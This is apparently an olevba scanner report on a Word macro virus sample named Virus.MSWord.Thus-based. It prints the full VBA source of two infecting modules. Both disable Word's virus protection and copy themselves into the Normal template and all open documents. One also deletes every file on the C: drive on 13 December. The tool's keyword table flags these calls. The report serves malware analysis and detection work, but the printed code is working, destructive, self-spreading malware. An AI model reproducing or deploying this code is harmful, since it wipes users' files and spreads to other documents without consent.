olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-df9cf841e7b04213e7d83a5d411a93621af28bb1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-df9cf841e7b04213e7d83a5d411a93621af28bb1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Thus_001'" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Thus_001'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
    If (Day(Now()) = 13) And (Month(Now()) = 12) Then
    With Application.FileSearch
        .NewSearch
        .LookIn = "C:\"
        .SearchSubFolders = True
        .FileName = "*.*"
        .MatchTextExactly = False
        .FileType = msoFileTypeAllFiles
        If .Execute > 0 Then
        For i = 1 To .FoundFiles.Count
        Kill .FoundFiles(i)
        Next i
        End If
    End With
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub




















































































-------------------------------------------------------------------------------
VBA MACRO CountZero.bas 
in file: Virus.MSWord.Thus-based-df9cf841e7b04213e7d83a5d411a93621af28bb1 - OLE stream: 'Macros/VBA/CountZero'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Dim vbc As VBComponent
Dim cm As CodeModule
Dim vir As CodeModule
Dim cdoc As Document
Dim vbiref As Reference
On Error Resume Next
If ThisDocument.Name <> NormalTemplate.Name Then
    Set vbc = NormalTemplate.VBProject.VBComponents("CountZero")
    If Err <> 0 Then
        For Each vbiref In ThisDocument.VBProject.References
        If vbiref.Name = "VBIDE" Then
            Exit For
        End If
        Next
        Set vbc = NormalTemplate.VBProject.VBComponents.Add(vbext_ct_StdModule)
        vbc.Name = "CountZero"
        Set cm = vbc.CodeModule
        Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
        cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
        NormalTemplate.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
    Else
        Set cm = vbc.CodeModule
        Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
        If cm.Lines(1, cm.CountOfLines) <> vir.Lines(1, vir.CountOfLines) Then
            For Each vbiref In ThisDocument.VBProject.References
                If vbiref.Name = "VBIDE" Then
                    Exit For
                End If
            Next
            Set vbc = NormalTemplate.VBProject.VBComponents.Add(vbext_ct_StdModule)
            vbc.Name = "CountZero"
            Set cm = vbc.CodeModule
            Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
            cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
            NormalTemplate.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
        End If
    End If
End If
For Each cdoc In Documents
    Clone cdoc
    cdoc.Save
Next

Options.VirusProtection = False
Application.Activate
On Error GoTo 0
End Sub
Sub Clone(ByRef dest As Document)
Dim vbiref As Reference
Dim vbc As VBComponent
Dim cm As CodeModule
Dim vir As CodeModule
On Error Resume Next
For Each vbiref In ThisDocument.VBProject.References
    If vbiref.Name = "VBIDE" Then
        Exit For
    End If
Next
Set vbc = dest.VBProject.VBComponents("CountZero")
If Err <> 0 Then
    Set vbc = dest.VBProject.VBComponents.Add(vbext_ct_StdModule)
    vbc.Name = "CountZero"
    Set cm = vbc.CodeModule
    Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
    cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
    dest.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
Else
    Set cm = vbc.CodeModule
    Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
    If cm.Lines(1, cm.CountOfLines) <> vir.Lines(1, vir.CountOfLines) Then
        Set vbc = dest.VBProject.VBComponents.Add(vbext_ct_StdModule)
        vbc.Name = "CountZero"
        Set cm = vbc.CodeModule
        Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
        cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
        dest.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
    End If
End If
End Sub
Sub AutoNew()
Dim adoc As Document
    If ThisDocument.Name = NormalTemplate.Name Then
        For Each adoc In Documents
            Clone adoc
        Next
        Application.Activate
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

